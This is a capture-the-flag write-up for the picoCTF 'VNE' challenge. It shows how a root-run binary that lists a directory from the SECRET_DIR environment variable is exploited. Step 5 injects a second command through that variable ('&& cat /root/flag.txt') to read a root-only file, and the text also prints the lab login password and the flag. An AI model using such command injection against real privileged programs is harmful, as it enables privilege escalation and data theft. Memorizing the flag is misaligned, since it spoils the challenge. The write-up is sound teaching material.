# Writeup: VNE

## Overview

This challenge involves understanding of Linux operator and environment variables to reveal the flag.

## Info

1. **Challenge Description**

```text
We've got a binary that can list directories as root, try it out !! 
ssh to saturn.picoctf.net:50136, and run the binary named "bin" once connected. 
Login as ctf-player with the password, 3f39b042
```

2. Hint
  - Have you checked the content of the /root folder
  - Find a way to add more instructions to the ls

## Exploitation steps
1. Connect to the server as `ctf-player`.

```terminal
$ ssh -p 50136 ctf-player@saturn.picoctf.net
```

2. Check files in the current directory.

```terminal
ctf-player@pico-chall$ ls
bin
```

3. Run `bin` as in the challenge description said.

```terminal
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
```

  - `bin` requires the `SECRET_DIR` environment variable to be set.

4. Set the environment variable `SECRET_DIR` to `/root` and run `bin` again.

```terminal
ctf-player@pico-chall$ export SECRET_DIR=/root
ctf-player@pico-chall$ ./bin
Listing the content of /root as root: 
flag.txt
```

  - Seems like the `bin` running `ls $SECRET_DIR`

5. Add the instruction using `&&` operator to output the flag.

```terminal
ctf-player@pico-chall$ export SECRET_DIR='/root && cat /root/flag.txt'
ctf-player@pico-chall$ ./bin
Listing the content of /root && cat /root/flag.txt as root: 
flag.txt
picoCTF{Power_t0_man!pul4t3_3nv_1670f174}
```

##  Conclusion
By setting up `SECRET_DIR` environment variable and adding additional commands, we can reveal the flag.
